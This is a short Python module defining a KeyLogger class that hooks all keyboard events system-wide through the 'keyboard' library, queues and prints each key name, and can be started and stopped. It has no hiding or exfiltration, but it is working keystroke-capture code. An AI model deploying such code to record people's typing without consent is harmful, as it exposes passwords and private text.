from typing import Callable

from keyboard import hook, KeyboardEvent, unhook
from queue import Queue
import threading


class KeyLogger:
    """
    class for capturing all the keys click
    """
    def __init__(self):
        self.keys = Queue()
        self.callback = None
        self.odd = True

    def add(self, event: KeyboardEvent):
        """
        adds the event to the queue, but ignore the doubles
        """
        if self.odd:
            self.keys.put(event.name)
            self.odd = False
            print(event.name)
        else:
            self.odd = True

    def start(self, callback: Callable[[KeyboardEvent], None] | None = None) -> bool:
        """
        gets the function to call whenever a key is clicked.
        Starts th kre logger and return whether succeeded ot not.
        """
        callback = callback if callback else self.add
        if self.callback:
            return False
        self.callback = hook(callback)
        return True

    def stop(self) -> bool:
        """
        Stops the keylogger. returns whether succeeded ot not.
        """
        if not self.callback:
            # raise RuntimeError("the keylogger is already stopped")
            return False
        unhook(self.callback)
        self.callback = None
        self.keys = Queue()
        return True
